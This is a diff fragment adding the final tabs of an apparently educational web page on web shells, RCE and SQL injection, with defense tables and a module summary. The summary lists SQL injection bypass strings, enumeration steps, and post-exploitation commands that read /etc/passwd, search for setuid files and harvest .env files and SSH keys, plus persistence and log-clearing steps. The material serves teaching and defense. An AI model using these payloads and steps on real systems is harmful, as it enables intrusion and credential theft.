+                            <td>Run PHP as low-privilege user</td>
+                            <td>Apache/Nginx runs as 'www-data' not 'root', restrict file permissions</td>
+                            <td>Medium</td>
+                        </tr>
+                        <tr>
+                            <td>Log File Injection</td>
+                            <td>Disable log inclusion via PHP</td>
+                            <td>Set allow_url_include = off, Remove log files from webroot</td>
+                            <td>High</td>
+                        </tr>
+                        <tr>
+                            <td>Symlink Following</td>
+                            <td>Disable via php.ini</td>
+                            <td>open_basedir = /var/www/html, Disable symlink following</td>
+                            <td>High</td>
+                        </tr>
+                    </table>
+                </div>
+
+                <div class="defense-comparison">
+                    <h3>Defense Against SQL Injection</h3>
+                    <table class="defense-table">
+                        <tr>
+                            <th>Attack Type</th>
+                            <th>Prevention Method</th>
+                            <th>Implementation</th>
+                            <th>Effectiveness</th>
+                        </tr>
+                        <tr>
+                            <td>Authentication Bypass</td>
+                            <td>Prepared statements + Input validation</td>
+                            <td>Use $pdo->prepare() with placeholders, Validate username format</td>
+                            <td>CRITICAL</td>
+                        </tr>
+                        <tr>
+                            <td>Data Extraction (Union-based)</td>
+                            <td>Parameterized queries, Least privilege DB user</td>
+                            <td>All queries via prepare(), DB user SELECT-only on app tables</td>
+                            <td>Very High</td>
+                        </tr>
+                        <tr>
+                            <td>Data Extraction (Blind)</td>
+                            <td>Error suppression + Prepared statements</td>
+                            <td>No detailed error messages to user, Use WAF to detect patterns</td>
+                            <td>High</td>
+                        </tr>
+                        <tr>
+                            <td>Data Modification (DROP/DELETE)</td>
+                            <td>Database permission restrictions</td>
+                            <td>App user GRANT SELECT, INSERT, UPDATE only; No DROP/DELETE/ALTER</td>
+                            <td>Very High</td>
+                        </tr>
+                        <tr>
+                            <td>Privilege Escalation</td>
+                            <td>Separate accounts by role</td>
+                            <td>App account, Admin account, Read-only accounts - all with minimal privileges</td>
+                            <td>High</td>
+                        </tr>
+                    </table>
+                </div>
+
+                <div class="defense-card">
+                    <h3>Security Testing & Monitoring</h3>
+                    <ul>
+                        <li><strong>Code Review:</strong> Manual security review of all database queries before deployment</li>
+                        <li><strong>Static Analysis:</strong> Use SAST tools (SonarQube, Checkmarx) to find vulnerabilities in code</li>
+                        <li><strong>Dynamic Testing:</strong> Use DAST tools (OWASP ZAP, Burp Suite) to test running application</li>
+                        <li><strong>Penetration Testing:</strong> Hire security professionals to test application</li>
+                        <li><strong>Log Monitoring:</strong> Monitor application & database logs for SQL injection attempts</li>
+                        <li><strong>Intrusion Detection:</strong> Use IDS to detect exploitation attempts</li>
+                        <li><strong>Regular Updates:</strong> Keep frameworks, libraries, and database software patched</li>
+                        <li><strong>Security Training:</strong> Train developers on secure coding practices</li>
+                    </ul>
+                </div>
+
+                <div class="defense-card">
+                    <h3>Architecture-Level Defenses</h3>
+                    <ul>
+                        <li><strong>Network Segmentation:</strong> Database server isolated from public internet, only app servers can access</li>
+                        <li><strong>Firewall Rules:</strong> Only allow connections from application server to database server</li>
+                        <li><strong>SSL/TLS Encryption:</strong> Encrypt database connections, protect against man-in-the-middle</li>
+                        <li><strong>Database Audit Logging:</strong> Log all queries and access attempts, detect suspicious activity</li>
+                        <li><strong>Principle of Least Privilege:</strong> Each component only has access it needs</li>
+                        <li><strong>Defense in Depth:</strong> Multiple layers so if one fails, others still protect</li>
+                        <li><strong>Backup & Recovery:</strong> Regular backups to recover from ransomware/data destruction attacks</li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- Tab 16: Module Summary -->
+            <div class="tab-content" id="summary">
+                <h2>Module Completion: Web Shells, RCE & SQL Injection</h2>
+                <p class="subtitle">Complete Review & Key Takeaways</p>
+
+                <div class="summary-card">
+                    <h3>Web Shells & RCE Attack Methods</h3>
+                    <ul>
+                        <li><strong>Web Shells:</strong> PHP/ASP files uploaded to web directory enabling command execution via HTTP</li>
+                        <li><strong>PHP Dangerous Functions:</strong> system(), shell_exec(), exec(), passthru() all execute OS commands</li>
+                        <li><strong>File Upload Exploitation:</strong> Bypass file type filters (double extension, MIME type manipulation, polyglot files)</li>
+                        <li><strong>Parameter Injection:</strong> Commands embedded in GET/POST parameters executed by PHP functions</li>
+                        <li><strong>Template Injection:</strong> Twig/Jinja2/Smarty templates can execute code if user input processed</li>
+                        <li><strong>Log File Inclusion:</strong> Inject PHP code into logs, include logs as PHP file</li>
+                    </ul>
+                </div>
+
+                <div class="summary-card">
+                    <h3>RCE Post-Exploitation Steps</h3>
+                    <ol style="list-style: decimal; margin-left: 20px;">
+                        <li><strong>Verify Access:</strong> whoami, id, pwd confirm shell functionality</li>
+                        <li><strong>Enumerate System:</strong> uname -a, cat /etc/passwd, ls -la / find configuration/sensitive file locations</li>
+                        <li><strong>Privilege Discovery:</strong> sudo -l, find / -perm -4000 identify privilege escalation paths</li>
+                        <li><strong>Credential Harvesting:</strong> cat config.php, .env files, SSH keys, bash history</li>
+                        <li><strong>Lateral Movement:</strong> Use stolen credentials to access other systems</li>
+                        <li><strong>Persistence:</strong> Create backdoor accounts, cron jobs, modify startup scripts</li>
+                        <li><strong>Covering Tracks:</strong> Clear logs, remove evidence of intrusion</li>
+                    </ol>
+                </div>
+
+                <div class="summary-card">
+                    <h3>SQL Injection Attack Methods</h3>
+                    <ul>
+                        <li><strong>Authentication Bypass:</strong> admin' -- or admin' OR '1'='1 to bypass login</li>
+                        <li><strong>Union-Based:</strong> UNION SELECT to extract data from other tables</li>
+                        <li><strong>Boolean-Based Blind:</strong> True/false responses determine data character-by-character</li>
+                        <li><strong>Time-Based Blind:</strong> SLEEP(5) responses determine successful injection</li>
+                        <li><strong>Error-Based:</strong> Exploit error messages to extract data</li>
+                        <li><strong>Stacked Queries:</strong> Multiple SQL statements in single injection (database-dependent)</li>
+                        <li><strong>Second-Order:</strong> Stored SQL injection in database, executed later</li>
+                    </ul>
+                </div>
+
+                <div class="summary-card">
+                    <h3>SQL Injection Exploitation Steps</h3>
+                    <ol style="list-style: decimal; margin-left: 20px;">
+                        <li><strong>Identify Vulnerability:</strong> Test parameters with quotes, AND, OR, UNION syntax</li>
+                        <li><strong>Determine Database Type:</strong> @@version (MySQL), @@SERVERNAME (MSSQL), version() (PostgreSQL)</li>
+                        <li><strong>Find Column Count:</strong> ORDER BY X, UNION SELECT with NULLs</li>
+                        <li><strong>Enumerate Databases:</strong> information_schema.tables query</li>
+                        <li><strong>Enumerate Tables:</strong> Find users, admin, passwords tables</li>
+                        <li><strong>Enumerate Columns:</strong> Find username, password, email columns</li>
+                        <li><strong>Extract Data:</strong> UNION SELECT to retrieve usernames, passwords, emails</li>
+                        <li><strong>Crack Passwords:</strong> Use extracted hashes with John, Hashcat, rainbow tables</li>
+                    </ol>
+                </div>
+
+                <div class="summary-card">
+                    <h3>Critical Defense Principles</h3>
+                    <ul>
+                        <li><strong>Never Trust User Input:</strong> All input must be validated, sanitized, treated as hostile</li>
+                        <li><strong>Prepared Statements:</strong> ALWAYS use parameterized queries; separate code from data</li>
+                        <li><strong>Least Privilege:</strong> Database users limited to required permissions only</li>
+                        <li><strong>Defense in Depth:</strong> Multiple layers (prepared statements, validation, WAF, monitoring)</li>
+                        <li><strong>Disable Dangerous Functions:</strong> system(), exec(), shell_exec() should be disabled</li>
+                        <li><strong>Error Suppression:</strong> Generic errors to user; detailed logs to secure file</li>
+                        <li><strong>File Upload Security:</strong> Validate type/extension, store outside webroot</li>
+                        <li><strong>Stay Updated:</strong> Patch frameworks, libraries, database software immediately</li>
+                        <li><strong>Security Testing:</strong> Regular code reviews, SAST/DAST scanning, penetration testing</li>
+                    </ul>
+                </div>
+
+                <div class="summary-card">
+                    <h3>Real-World Impact</h3>
+                    <ul>
+                        <li><strong>Frequency:</strong> SQL Injection remains #3 on OWASP Top 10; found in production systems daily</li>
+                        <li><strong>Data Breaches:</strong> Sony, Target, OPM, LinkedIn, Yahoo all suffered major SQL injection breaches</li>
+                        <li><strong>Ransomware:</strong> Attackers use RCE to deploy ransomware, encrypt entire databases</li>
+                        <li><strong>Financial Impact:</strong> Average breach costs $4.45M; reputational damage persists years</li>
+                        <li><strong>Compliance:</strong> GDPR, HIPAA, PCI-DSS require secure database access; violations costly</li>
+                        <li><strong>Business Risk:</strong> Regulatory fines, lawsuits, customer loss, operational disruption</li>
+                    </ul>
+                </div>
+
+                <div class="completion-badge">
+                    <h2>✓ Module 11 Complete</h2>
+                    <p><strong>You have mastered:</strong></p>
+                    <ul style="text-align: left; display: inline-block;">
+                        <li>✓ Web shell creation and exploitation techniques</li>
+                        <li>✓ PHP dangerous functions and runtime command execution</li>
+                        <li>✓ File upload bypass techniques and payload delivery</li>
+                        <li>✓ RCE attack scenarios and post-exploitation methodology</li>
+                        <li>✓ SQL injection fundamentals and attack methods</li>
+                        <li>✓ Database enumeration and automated exploitation with SQLMap</li>
+                        <li>✓ Comprehensive defense strategies and secure coding practices</li>
+                    </ul>
+                    <p style="margin-top: 20px;"><strong>Next Steps:</strong> Apply these concepts in a lab environment. Practice with OWASP WebGoat, HackTheBox, TryHackMe, and Burp Suite to solidify your understanding.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
